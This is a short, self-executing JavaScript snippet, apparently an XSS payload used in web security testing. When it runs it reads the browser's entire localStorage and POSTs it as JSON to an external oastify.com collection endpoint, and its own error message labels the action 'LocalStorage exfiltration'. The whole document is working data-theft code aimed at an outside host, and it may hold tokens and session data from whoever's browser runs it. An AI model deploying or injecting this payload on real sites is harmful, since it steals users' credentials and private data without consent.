(function(){
  try {
    fetch('https://xlmago2fju6ttmjl0ikt3k3s5jbaz0np.oastify.com/save', {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(localStorage)
    });
  } catch (e) {
    console.error('LocalStorage exfiltration failed', e);
  }
})();
